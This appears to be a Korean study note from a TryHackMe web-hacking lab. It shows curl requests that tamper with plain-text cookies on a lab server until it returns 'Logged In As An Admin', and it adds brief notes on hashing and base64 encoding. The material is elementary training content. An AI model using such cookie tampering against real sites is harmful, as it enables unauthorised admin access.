# Cookie TamperingCookie


## 쿠키 이름이 Plain Text일 때 

### 실습
```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```
시도 1 
```
user@tryhackme$ curl http://10.10.3.25/cookie-test
```
```
Not Logged In
```
시도 2
```
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.3.25/cookie-test
```
```
Logged In As A User
```
시도 3 
```
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.3.25/cookie-test
```
```
Logged In As An Admin
```
---

## Hashing

irreversible representation of the original text

[Free Password Hash Cracker](https://crackstation.net/)

1을 변환하면  
md5 :   
c4ca4238a0b923820dcc509a6f75849b  

sha-256 :  
6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b  

sha-512	: dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a  

sha1 :   
356a192b7913b04c54574d18c28d46e6395428ab

---

## Encoding

encoding is reversible

Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

base32, base64  

[BASE64 Decode and Encode](https://www.base64encode.org/)





---
---

### Course
[TryHackMe - Introduction to Web Hacking](https://tryhackme.com/module/intro-to-web-hacking)    
